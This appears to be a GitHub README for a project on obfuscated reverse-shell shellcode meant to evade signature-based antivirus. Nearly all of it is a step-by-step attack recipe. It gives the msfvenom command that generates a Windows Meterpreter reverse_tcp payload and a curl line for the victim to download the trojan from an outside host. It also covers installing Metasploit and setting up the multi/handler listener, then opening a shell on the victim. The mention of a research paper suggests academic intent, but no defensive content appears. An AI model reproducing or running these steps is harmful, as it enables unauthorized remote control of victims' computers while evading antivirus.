# reverse-shell
Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus




# 10/14/2024:
    
    Russell:
      - created GitHub repo and uploaded the research paper as well as our proposal.
      - created and uploaded payload-22.c

  To create a payload (using kali):
            
      $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0"
      
  To download the trojan as a victim:
    
      $curl -O http://bigbadcyborg.com/payload-22.txt
      
  Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
      To download the metasploit installer:
      
      $curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
      $chmod 755 msfinstall
      $./msfinstall
      $sudo msfconsole
      

  To run listener on attackers machine:
      
      $msfconsole
      $use exploit/multi/handler
      $set PAYLOAD windows/x64/meterpreter/reverse_tcp
      $set LHOST your_ip
      $set LPORT 4444
      $exploit
      

  Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
      attacker enters the following command to enter the shell of the victim:
      
      $shell



  For a broad video explanation watch the following youtube video:
      https://www.youtube.com/watch?v=17JontiMrWQ
      

  

    
